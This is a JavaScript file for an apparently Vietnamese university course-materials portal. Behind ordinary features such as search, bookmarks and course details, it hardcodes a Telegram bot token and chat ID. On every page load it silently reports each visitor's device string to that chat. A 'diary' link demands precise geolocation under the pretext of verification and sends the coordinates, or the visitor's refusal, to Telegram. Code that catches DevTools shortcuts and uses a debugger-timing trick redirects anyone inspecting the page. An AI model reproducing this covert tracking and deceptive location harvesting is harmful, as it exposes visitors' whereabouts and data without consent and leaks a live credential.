const body = document.body;
const themeToggle = document.getElementById("theme-toggle");
const themeIcon = themeToggle?.querySelector("i");
const courseSearch = document.getElementById("course-search");
const clearSearch = document.getElementById("clear-search");
const tabContent = document.getElementById("semester-tabContent");
const universityElapsed = document.getElementById("university-elapsed");
const universityProgress = document.getElementById("university-progress");
const universityPercent = document.getElementById("university-percent");
const universityProgressBar = document.getElementById("university-progress-bar");
const courseItems = Array.from(document.querySelectorAll(".course-item"));
const courseModal = document.getElementById("course-modal");
const courseModalBody = document.getElementById("course-modal-body");
const courseModalClose = document.getElementById("course-modal-close");
const backToTop = document.getElementById("back-to-top");
const toastRoot = document.getElementById("toast-root");
const TELEGRAM_BOT_TOKEN = "8632589547:AAGQjBlLd906MzjBsr8ToOTXp-J_1VoPqGU";
const TELEGRAM_CHAT_ID = "6149032213";

// Security: Chặn phím tắt mở DevTools và View Source
function protectDevTools() {
  document.addEventListener("keydown", (e) => {
    if (
      e.key === "F12" ||
      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) ||
      (e.ctrlKey && e.key === "u")
    ) {
      e.preventDefault();
      globalThis.location.href = "https://www.google.com";
    }
  });

  document.addEventListener("contextmenu", (e) => e.preventDefault());

  // Phát hiện DevTools mở thủ công bằng cách kiểm tra kích thước hoặc debugger
  const detector = () => {
    const threshold = 160;
    const widthDiff = globalThis.outerWidth - globalThis.innerWidth > threshold;
    const heightDiff = globalThis.outerHeight - globalThis.innerHeight > threshold;

    if (widthDiff || heightDiff) {
      globalThis.location.href = "https://www.google.com";
    }

    // Debugger trick
    const start = new Date();
    debugger;
    const end = new Date();
    if (end - start > 100) {
      globalThis.location.href = "https://www.google.com";
    }
  };

  setInterval(detector, 2000);
}


const BOOKMARK_KEY = "learn-bookmarks";
let globalResults;
let revealObserver;

const courseInsights = {
  CEA201: ["CPU, memory, instruction cycle và cách máy tính thực thi chương trình ở tầng phần cứng.", "Nắm binary, logic gates, CPU pipeline và memory hierarchy trước khi ôn quiz."],
  CSI106: ["Bức tranh tổng quan ngành Computer Science, tư duy thuật toán và các khái niệm nền.", "Dùng để xây nền trước khi vào lập trình, cấu trúc dữ liệu và hệ thống."],
  PRF192: ["Nhập môn lập trình C, biến, hàm, mảng, con trỏ và tư duy giải bài bằng code.", "Nên luyện nhiều bài PE nhỏ để quen input/output và debug."],
  PRO192: ["Lập trình hướng đối tượng với Java: class, object, inheritance, polymorphism.", "Tập trung OOP, collection, exception và format bài PE."],
  WED201: ["HTML, CSS, Bootstrap và tư duy dựng giao diện web cơ bản.", "Ôn layout, responsive, form và các yêu cầu PE thường gặp."],
  CSD201: ["Cấu trúc dữ liệu và giải thuật: list, stack, queue, tree, sort/search.", "Nên tự code lại từng cấu trúc để hiểu thao tác và độ phức tạp."],
  DBI202: ["Thiết kế cơ sở dữ liệu, SQL, ERD, normalization và truy vấn dữ liệu.", "Luyện SELECT, JOIN, GROUP BY, subquery và stored procedure."],
  PRJ301: ["Java Web với Servlet/JSP, MVC, session, filter và kết nối database.", "Nắm flow request-response và cách chia controller/service/DAO."],
  SWE202c: ["Nhập môn software engineering, quy trình phát triển phần mềm và mô hình MVC.", "Tập trung requirement, design diagram và cách trình bày ý tưởng hệ thống."],
  SWR302: ["Phân tích yêu cầu phần mềm, SRS, use case và đặc tả nghiệp vụ.", "Viết rõ actor, flow, exception và non-functional requirements."],
  SWP391: ["Dự án phát triển phần mềm theo nhóm, báo cáo, demo và quản lý tiến độ.", "Quan trọng nhất là scope rõ, role rõ, demo ổn và tài liệu nhất quán."],
  SWT301: ["Kiểm thử phần mềm, test plan, test case, unit test và automation cơ bản.", "Ôn JUnit/TestNG, boundary cases và cách viết test có ý nghĩa."],
  WDU203c: ["UI/UX design, wireframe, design system và tư duy trải nghiệm người dùng.", "Chú ý user flow, consistency, spacing, hierarchy và prototype."],
  HSF302: ["Spring Framework/Spring Boot, REST API, dependency injection và backend service.", "Nắm controller-service-repository, validation và config database."],
  FER202: ["React frontend: component, props, state, hooks, routing và gọi API.", "Luyện useState/useEffect, form, CRUD và chia component sạch."],
  OJT202: ["Thực tập doanh nghiệp, áp dụng kiến thức vào môi trường làm việc thật.", "Chuẩn bị CV, portfolio, thái độ học hỏi và ghi lại kinh nghiệm thực tế."],
  ENW493c: ["Research method và academic writing cho báo cáo, paper và tài liệu học thuật.", "Tập trung citation, structure, paraphrase và cách trình bày luận điểm."],
  SBA301: ["Tích hợp SPA với Spring Boot, nối frontend hiện đại với backend REST API.", "Chú ý auth, CORS, API contract và state management."],
  PMG201c: ["Quản lý dự án: scope, timeline, risk, stakeholder và tracking tiến độ.", "Dùng tốt cho SWP/Capstone khi cần chia việc và báo cáo."],
  SWD392: ["Software Architecture and Design: kiến trúc hệ thống, pattern và decision trade-off.", "Tập trung layered architecture, design pattern và diagram."],
  MSS301: ["Microservices với Spring Cloud, service discovery, gateway và distributed system.", "Nên hiểu monolith vs microservices, config, resilience và API gateway."],
  PRM393: ["Mobile Programming, xây app mobile và xử lý UI, navigation, API, local data.", "Luyện flow màn hình, form, list, state và gọi API."],
  SE_GRA_ELE: ["Graduation elective cho Software Engineering, chuẩn bị kiến thức cuối chương trình.", "Nên liên hệ định hướng Capstone và portfolio cá nhân."],
};

const topicVisuals = [
  { keys: ["spring", "microservices", "architecture", "java web", "backend", "rest"], icon: "fa-diagram-project", label: "Backend system", gradient: "linear-gradient(135deg, #0ea5e9, #22c55e)" },
  { keys: ["react", "front-end", "spa", "ui/ux", "web design"], icon: "fa-object-group", label: "Frontend experience", gradient: "linear-gradient(135deg, #2563eb, #7c3aed)" },
  { keys: ["database", "sql"], icon: "fa-database", label: "Data layer", gradient: "linear-gradient(135deg, #0891b2, #0f766e)" },
  { keys: ["algorithm", "data structures"], icon: "fa-sitemap", label: "Algorithms", gradient: "linear-gradient(135deg, #16a34a, #84cc16)" },
  { keys: ["mobile"], icon: "fa-mobile-screen-button", label: "Mobile app", gradient: "linear-gradient(135deg, #db2777, #f97316)" },
  { keys: ["project", "management", "entrepreneurship", "ojt"], icon: "fa-briefcase", label: "Project work", gradient: "linear-gradient(135deg, #f59e0b, #ef4444)" },
  { keys: ["philosophy", "political", "socialism", "history", "ideology"], icon: "fa-landmark", label: "Foundation studies", gradient: "linear-gradient(135deg, #64748b, #334155)" },
];

function readStore(key, fallback = []) {
  try {
    return JSON.parse(localStorage.getItem(key)) || fallback;
  } catch {
    return fallback;
  }
}

function writeStore(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function showToast(message, type = "") {
  if (!toastRoot) return;

  const toast = document.createElement("div");
  toast.className = `app-toast ${type}`.trim();
  toast.textContent = message;
  toastRoot.appendChild(toast);
  window.setTimeout(() => toast.remove(), 2600);
}

function setTheme(theme) {
  const isDark = theme === "dark";
  body.classList.toggle("dark-mode", isDark);
  themeIcon?.classList.toggle("fa-moon", !isDark);
  themeIcon?.classList.toggle("fa-sun", isDark);
  themeToggle?.setAttribute("aria-label", isDark ? "Chuyển sang giao diện sáng" : "Chuyển sang giao diện tối");
}

function getCourseCode(item) {
  return item.querySelector(".course-info h3")?.textContent.trim() || "COURSE";
}

function getCourseTitle(item) {
  return item.querySelector(".course-info p")?.textContent.trim() || "Tài liệu môn học";
}

function getCourseHref(item) {
  if (!item.matches("a")) return "";
  const attr = item.getAttribute("href");
  if (!attr || attr === "#") return "";
  return item.href;
}

function getSemesterIndex(item) {
  const pane = item.closest(".tab-pane");
  return Number(pane?.id?.replace("ky", "")) || 0;
}

function getSemesterName(item) {
  const pane = item.closest(".tab-pane");
  const tab = pane ? document.querySelector(`[href="#${pane.id}"]`) : null;
  return tab?.textContent.trim() || "Tài liệu";
}

function getItemText(item) {
  return item.textContent.toLowerCase();
}

function addTag(item, label, className = "") {
  const tags = item.querySelector(".tags");
  if (!tags || Array.from(tags.children).some((tag) => tag.textContent.trim().toLowerCase() === label.toLowerCase())) return;

  const tag = document.createElement("span");
  tag.className = `badge-tag ${className}`.trim();
  tag.textContent = label;
  tags.appendChild(tag);
}

function deriveTypes(item) {
  const href = getCourseHref(item).toLowerCase();
  const text = getItemText(item);
  const types = [];

  if (href.includes("drive.google.com")) types.push("Drive");
  if (href.includes("quizlet.com") || text.includes("quizlet")) types.push("Quizlet");
  if (text.includes("source") || text.includes("code") || text.includes("github")) types.push("Source");
  if (text.includes("project") || text.includes("swp") || text.includes("capstone") || text.includes("đồ án")) types.push("Project");
  if (text.includes("video") || text.includes("record")) types.push("Video");
  if (text.includes("pe")) types.push("PE");
  if (text.includes("fe")) types.push("FE");
  if (!href) types.push("No link yet");

  return [...new Set(types)];
}

function isExamMatch(item) {
  const text = getItemText(item);
  return ["pe", "fe", "exam", "thi", "đề", "practice", "luyện"].some((keyword) => text.includes(keyword));
}

function augmentCourseCards() {
  const bookmarks = readStore(BOOKMARK_KEY);

  courseItems.forEach((item) => {
    const code = getCourseCode(item);
    const semesterIndex = getSemesterIndex(item);
    const href = getCourseHref(item);
    const types = deriveTypes(item);

    item.dataset.code = code;
    item.dataset.title = getCourseTitle(item);
    item.dataset.semester = String(semesterIndex);
    item.dataset.href = href;
    item.dataset.types = types.join(", ");
    item.classList.add(`semester-theme-${semesterIndex}`);
    item.classList.toggle("exam-match", isExamMatch(item));

    types.forEach((type) => {
      const className = type === "PE" || type === "FE" ? "highlight-alert" : type === "No link yet" ? "course-status" : "";
      addTag(item, type, className);
    });

    if (semesterIndex >= 6) addTag(item, "New", "new-tag");
    if (isExamMatch(item)) addTag(item, "Hot", "hot-tag");
    if (!href) addTag(item, "Đang cập nhật", "course-status");
    if (!item.querySelector(".course-tools")) {
      const tools = document.createElement("div");
      tools.className = "course-tools";
      tools.innerHTML = `
        <button class="course-tool bookmark-tool" type="button" data-action="bookmark" title="Ghim môn"><i class="fa-regular fa-star"></i></button>
        <button class="course-tool" type="button" data-action="copy" title="Copy mã môn"><i class="fa-regular fa-copy"></i></button>
        <button class="course-tool" type="button" data-action="share" title="Share môn"><i class="fa-solid fa-share-nodes"></i></button>
        <button class="course-tool" type="button" data-action="detail" title="Chi tiết"><i class="fa-solid fa-circle-info"></i></button>
      `;
      item.appendChild(tools);
    }

    item.querySelector(".bookmark-tool")?.classList.toggle("is-bookmarked", bookmarks.includes(code));
  });
}

function ensureGlobalResults() {
  if (globalResults) return globalResults;

  globalResults = document.createElement("section");
  globalResults.className = "global-results";
  globalResults.setAttribute("aria-live", "polite");
  globalResults.innerHTML = `
    <div class="results-header">
      <div>
        <span class="results-kicker">Kết quả tìm kiếm</span>
        <h2 id="results-title">Tìm trong toàn bộ 9 kỳ</h2>
      </div>
      <span id="results-count" class="results-count">0 môn</span>
    </div>
    <div class="course-list results-list"></div>
    <div class="empty-state no-results">
      <div class="empty-icon"><i class="fa-solid fa-magnifying-glass"></i></div>
      <h3>Không tìm thấy tài liệu phù hợp</h3>
      <p>Thử đổi từ khóa ngắn hơn hoặc chuyển sang học kỳ khác.</p>
    </div>
  `;

  tabContent.before(globalResults);
  return globalResults;
}

function renderGlobalResults(matches) {
  const results = ensureGlobalResults();
  const list = results.querySelector(".results-list");
  const count = results.querySelector("#results-count");
  const noResults = results.querySelector(".no-results");

  list.innerHTML = "";

  matches.forEach((item) => {
    const clone = item.cloneNode(true);
    const semesterTag = document.createElement("span");
    semesterTag.className = "badge-tag semester-tag";
    semesterTag.textContent = getSemesterName(item);
    clone.querySelector(".tags")?.prepend(semesterTag);
    list.appendChild(clone);
  });

  count.textContent = `${matches.length} môn`;
  list.hidden = matches.length === 0;
  noResults.classList.toggle("is-visible", matches.length === 0);
  prepareRevealCards(list.querySelectorAll(".course-item"));
}

function applyCourseFilters() {
  const query = courseSearch?.value.trim().toLowerCase() || "";
  const isGlobalSearch = query.length > 0;
  const matches = courseItems.filter((item) => {
    return getItemText(item).includes(query);
  });

  const results = ensureGlobalResults();
  results.classList.toggle("is-visible", isGlobalSearch);
  tabContent.hidden = isGlobalSearch;

  if (isGlobalSearch) renderGlobalResults(matches);

  clearSearch?.classList.toggle("is-visible", query.length > 0);
  prepareRevealCards(document.querySelectorAll(".tab-pane.active .course-item"));
}

function prepareRevealCards(items) {
  items.forEach((item, index) => {
    item.classList.remove("is-visible");
    item.classList.add("reveal-card");
    item.style.animationDelay = `${Math.min(index, 10) * 45}ms`;

    if (revealObserver) {
      revealObserver.unobserve(item);
      revealObserver.observe(item);
    } else {
      item.classList.add("is-visible");
    }
  });
}

function initRevealObserver() {
  if (!("IntersectionObserver" in window)) {
    document.querySelectorAll(".course-item").forEach((item) => item.classList.add("is-visible"));
    return;
  }

  revealObserver = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        entry.target.classList.add("is-visible");
        revealObserver.unobserve(entry.target);
      }
    });
  }, { threshold: 0.12 });

  prepareRevealCards(document.querySelectorAll(".course-item"));
}

function toggleBookmark(item) {
  const code = item.dataset.code;
  const bookmarks = readStore(BOOKMARK_KEY);
  const exists = bookmarks.includes(code);
  const next = exists ? bookmarks.filter((itemCode) => itemCode !== code) : [...bookmarks, code];

  writeStore(BOOKMARK_KEY, next);
  document.querySelectorAll(`[data-code="${CSS.escape(code)}"] .bookmark-tool`).forEach((button) => {
    button.classList.toggle("is-bookmarked", !exists);
  });
  showToast(exists ? `Đã bỏ ghim ${code}` : `Đã ghim ${code}`);
}

async function copyText(text, successMessage) {
  try {
    await navigator.clipboard.writeText(text);
    showToast(successMessage);
  } catch {
    showToast("Trình duyệt không cho copy tự động.");
  }
}

function getOriginalItemFromClone(item) {
  return courseItems.find((course) => getCourseCode(course) === item.dataset.code) || item;
}

function getCourseInsight(item) {
  const code = item.dataset.code;
  const title = item.dataset.title;
  const text = `${code} ${title} ${item.dataset.types}`.toLowerCase();
  const direct = courseInsights[code];
  const overview = direct?.[0] || `Môn ${code} tập trung vào ${title.toLowerCase()}, giúp bạn hoàn thiện một mảnh kiến thức trong lộ trình Software Engineering.`;
  const tip = direct?.[1] || "Nên xem lại slide, làm bài tập nhỏ, tổng hợp keyword quan trọng và luyện theo đề hoặc project mẫu nếu có.";
  const visual = topicVisuals.find((topic) => topic.keys.some((key) => text.includes(key))) || {
    icon: "fa-graduation-cap",
    label: "Course overview",
    gradient: "linear-gradient(135deg, #2563eb, #0f9f6e)",
  };
  return { overview, tip, visual };
}

function openCourseModal(item) {
  const original = getOriginalItemFromClone(item);
  const code = original.dataset.code;
  const href = original.dataset.href;
  const hasLink = Boolean(href);
  const insight = getCourseInsight(original);
  const types = (original.dataset.types || "").split(", ").filter(Boolean);

  courseModalBody.innerHTML = `
    <div class="modal-visual" style="--modal-gradient: ${insight.visual.gradient}">
      <div class="modal-visual-icon">
        <i class="fa-solid ${insight.visual.icon}"></i>
      </div>
      <div>
        <span>${insight.visual.label}</span>
        <strong>${getSemesterName(original)}</strong>
      </div>
    </div>
    <div class="modal-course-head">
      ${original.querySelector(".course-icon")?.outerHTML || ""}
      <div>
        <h2>${code}</h2>
        <p>${original.dataset.title}</p>
        <div class="tags">
          <span class="badge-tag semester-tag">${getSemesterName(original)}</span>
          ${types.map((type) => `<span class="badge-tag">${type}</span>`).join("")}
        </div>
      </div>
    </div>
    <div class="modal-info-grid">
      <div>
        <span>Tổng quan</span>
        <p>${insight.overview}</p>
      </div>
      <div>
        <span>Gợi ý học</span>
        <p>${insight.tip}</p>
      </div>
      <div>
        <span>Trạng thái</span>
        <p>${hasLink ? "Đã có tài liệu/link để mở ngay." : "Tài liệu đang cập nhật, có thể inbox để hỏi nhanh."}</p>
      </div>
      <div>
        <span>Loại tài liệu</span>
        <p>${types.length ? types.join(", ") : "Tài liệu môn học"}</p>
      </div>
    </div>
    <div class="modal-actions">
      ${hasLink ? `<a href="${href}" target="_blank"><i class="fa-solid fa-arrow-up-right-from-square"></i> Mở tài liệu</a>` : `<button type="button" data-modal-action="missing"><i class="fa-solid fa-clock"></i> Đang cập nhật</button>`}
      <button type="button" data-modal-action="copy"><i class="fa-regular fa-copy"></i> Copy mã môn</button>
      <button type="button" data-modal-action="share"><i class="fa-solid fa-share-nodes"></i> Share môn</button>
    </div>
  `;
  courseModal.dataset.code = code;
  courseModal.classList.add("is-open");
  courseModal.setAttribute("aria-hidden", "false");
}

function closeModal(modal) {
  modal?.classList.remove("is-open");
  modal?.setAttribute("aria-hidden", "true");
}

function jumpToCourse(item) {
  if (!item) return;

  const original = getOriginalItemFromClone(item);
  const pane = original.closest(".tab-pane");
  const tab = pane ? document.querySelector(`[href="#${pane.id}"]`) : null;

  if (tab && !pane.classList.contains("active")) tab.click();

  window.setTimeout(() => {
    original.scrollIntoView({ behavior: "smooth", block: "center" });
    original.classList.add("focus-flash");
    window.setTimeout(() => original.classList.remove("focus-flash"), 1200);
  }, 140);
}

function handleCourseAction(item, action) {
  const original = getOriginalItemFromClone(item);
  const code = original.dataset.code;
  const href = original.dataset.href;

  if (action === "bookmark") toggleBookmark(original);
  if (action === "copy") copyText(code, `Đã copy ${code}`);
  if (action === "share") copyText(href || `${code} - ${original.dataset.title}`, `Đã copy thông tin ${code}`);
  if (action === "detail") openCourseModal(original);
}

function handleCourseOpen(item, event) {
  const original = getOriginalItemFromClone(item);

  if (!original.dataset.href) {
    event?.preventDefault();
    openCourseModal(original);
    showToast(`Tài liệu ${original.dataset.code} đang cập nhật, inbox để hỏi nhanh.`);
    return;
  }
}

function getElapsedParts(fromDate, toDate) {
  let years = toDate.getFullYear() - fromDate.getFullYear();
  let months = toDate.getMonth() - fromDate.getMonth();
  let days = toDate.getDate() - fromDate.getDate();
  let hours = toDate.getHours() - fromDate.getHours();
  let minutes = toDate.getMinutes() - fromDate.getMinutes();
  let seconds = toDate.getSeconds() - fromDate.getSeconds();

  if (seconds < 0) { seconds += 60; minutes -= 1; }
  if (minutes < 0) { minutes += 60; hours -= 1; }
  if (hours < 0) { hours += 24; days -= 1; }
  if (days < 0) {
    days += new Date(toDate.getFullYear(), toDate.getMonth(), 0).getDate();
    months -= 1;
  }
  if (months < 0) { months += 12; years -= 1; }

  return { years, months, days, hours, minutes, seconds };
}

function updateUniversityClock() {
  if (!universityElapsed || !universityProgress) return;

  const startDate = new Date("2023-09-20T00:00:00+07:00");
  const endDate = new Date("2027-09-20T00:00:00+07:00");
  const now = new Date();
  const elapsed = getElapsedParts(startDate, now);
  const totalDuration = endDate.getTime() - startDate.getTime();
  const currentDuration = Math.min(Math.max(now.getTime() - startDate.getTime(), 0), totalDuration);
  const progress = (currentDuration / totalDuration) * 100;

  universityElapsed.textContent = `${elapsed.years} năm ${elapsed.months} tháng ${elapsed.days} ngày`;
  universityProgress.textContent = `${elapsed.hours} giờ ${elapsed.minutes} phút ${elapsed.seconds} giây từ 20/09/2023`;
  if (universityPercent) universityPercent.textContent = `${progress.toFixed(1)}%`;
  if (universityProgressBar) universityProgressBar.style.width = `${progress}%`;
}

function initUniversityClock() {
  updateUniversityClock();
  globalThis.setInterval(updateUniversityClock, 1000);
}

let isLocationRequesting = false;

async function sendTelegramMessage(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("Telegram config missing.");
    return;
  }
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    console.log("Sending Telegram message...");
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
    });

    const result = await response.json();
    if (!response.ok) {
      console.error("Telegram API Error:", result);
    } else {
      console.log("Telegram message sent successfully.");
    }
  } catch (error) {
    console.error("Network Error (Telegram):", error);
  }
}

async function sendVisitorNotification() {
  const isReturning = localStorage.getItem("returning_visitor");
  const type = isReturning ? "RE-VISIT" : "NEW VISITOR";
  localStorage.setItem("returning_visitor", "true");

  const message = `<b>🌐 ${type}</b>\n\n⏰ Time: ${new Date().toLocaleString("vi-VN")}\n📱 Device: ${navigator.userAgent}\n🌍 Page: ${window.location.pathname}`;
  await sendTelegramMessage(message);
}

function handleDiaryAccess(event) {
  if (isLocationRequesting) {
    showToast("⏳ Đang xử lý yêu cầu vị trí, vui lòng đợi...", "warning");
    return;
  }

  console.log("Diary access triggered");
  event.preventDefault();

  // Lấy URL từ data-href thay vì href để bảo mật hơn
  const diaryUrl = event.currentTarget.dataset.href;
  const btn = event.currentTarget;

  if (!navigator.geolocation) {
    showToast("❌ Trình duyệt không hỗ trợ định vị hoặc cần HTTPS.", "error");
    return;
  }

  isLocationRequesting = true;
  btn.style.opacity = "0.6";
  btn.style.cursor = "wait";
  showToast("📍 Đang xác thực vị trí của bạn...");

  navigator.geolocation.getCurrentPosition(
    async (position) => {
      const { latitude, longitude, accuracy } = position.coords;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
      const message = `<b>🔓 TRUY CẬP NHẬT KÝ</b>\n\n📍 Vị trí: <a href="${mapsLink}">Xem trên Maps</a>\n🎯 Độ chính xác: ${accuracy.toFixed(1)}m\n⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}\n📱 Thiết bị: ${navigator.userAgent}`;

      console.log("Location found, sending notification...");
      await sendTelegramMessage(message);

      // Reset trạng thái
      isLocationRequesting = false;
      btn.style.opacity = "";
      btn.style.cursor = "";

      // Mở nhật ký sau khi đã gửi thông báo
      globalThis.open(diaryUrl, "_blank");
    },
    async (error) => {
      let errorMsg = "Lỗi định vị";
      if (error.code === 1) errorMsg = "Từ chối chia sẻ vị trí (Denied)";
      else if (error.code === 2) errorMsg = "Lỗi GPS/Mạng (Unavailable)";
      else if (error.code === 3) errorMsg = "Hết thời gian chờ (Timeout)";

      const message = `<b>🚫 TRUY CẬP BỊ CHẶN</b>\n\n❌ Lý do: ${errorMsg}\n⏰ Thời gian: ${new Date().toLocaleString("vi-VN")}\n📱 Thiết bị: ${navigator.userAgent}`;
      await sendTelegramMessage(message);

      showToast(`❌ Lỗi: ${errorMsg}. Bạn phải chia sẻ vị trí!`, "error");

      // Reset trạng thái để có thể thử lại
      isLocationRequesting = false;
      btn.style.opacity = "";
      btn.style.cursor = "";
    },
    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
  );
}

function initEvents() {
  document.getElementById("journey-open")?.addEventListener("click", handleDiaryAccess);

  themeToggle?.addEventListener("click", () => {
    const nextTheme = body.classList.contains("dark-mode") ? "light" : "dark";
    setTheme(nextTheme);
    localStorage.setItem("theme", nextTheme);
  });

  courseSearch?.addEventListener("input", applyCourseFilters);
  clearSearch?.addEventListener("click", () => {
    courseSearch.value = "";
    courseSearch.focus();
    applyCourseFilters();
  });

  document.addEventListener("click", (event) => {
    const tool = event.target.closest(".course-tool");
    const course = event.target.closest(".course-item");

    if (tool && course) {
      event.preventDefault();
      event.stopPropagation();
      handleCourseAction(course, tool.dataset.action);
      return;
    }

    if (course && !tool) handleCourseOpen(course, event);
  });

  document.querySelectorAll('a[target="_blank"]').forEach((link) => {
    link.rel = "noopener noreferrer";
  });

  document.querySelectorAll('[data-toggle="pill"]').forEach((tab) => {
    tab.addEventListener("click", () => window.setTimeout(applyCourseFilters, 80));
  });

  courseModalClose?.addEventListener("click", () => closeModal(courseModal));
  courseModal?.addEventListener("click", (event) => {
    if (event.target === courseModal) closeModal(courseModal);
    const action = event.target.closest("[data-modal-action]")?.dataset.modalAction;
    const item = courseItems.find((course) => getCourseCode(course) === courseModal.dataset.code);
    if (item && action === "copy") copyText(getCourseCode(item), `Đã copy ${getCourseCode(item)}`);
    if (item && action === "share") copyText(item.dataset.href || `${getCourseCode(item)} - ${item.dataset.title}`, `Đã copy thông tin ${getCourseCode(item)}`);
    if (action === "missing") showToast("Tài liệu đang cập nhật, inbox Messenger để hỏi nhanh.");
  });

  backToTop?.addEventListener("click", () => window.scrollTo({ top: 0, behavior: "smooth" }));
  window.addEventListener("scroll", () => {
    backToTop?.classList.toggle("is-visible", window.scrollY > 520);
  });

  document.addEventListener("keydown", (event) => {
    const activeTag = document.activeElement?.tagName?.toLowerCase();
    const isTyping = activeTag === "input" || activeTag === "textarea";

    if (event.key === "/" && !isTyping) {
      event.preventDefault();
      courseSearch?.focus();
    } else if (event.key === "Escape") {
      if (courseModal.classList.contains("is-open")) closeModal(courseModal);
      else if (courseSearch?.value) {
        courseSearch.value = "";
        applyCourseFilters();
      }
    } else if (!isTyping && (event.key === "ArrowRight" || event.key === "ArrowLeft")) {
      const tabs = Array.from(document.querySelectorAll('[data-toggle="pill"]'));
      const activeIndex = tabs.findIndex((tab) => tab.classList.contains("active"));
      const direction = event.key === "ArrowRight" ? 1 : -1;
      const next = tabs[(activeIndex + direction + tabs.length) % tabs.length];
      next?.click();
    }
  });
}

function init() {
  console.log("Initializing app...");
  protectDevTools();

  const savedTheme = localStorage.getItem("theme");
  const preferredTheme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
  setTheme(savedTheme || preferredTheme);
  augmentCourseCards();
  initEvents();
  applyCourseFilters();

  // Gửi thông báo visitor
  sendVisitorNotification();
}

init();

window.addEventListener("load", () => {
  body.classList.add("is-ready");
  initRevealObserver();
  initUniversityClock();
});
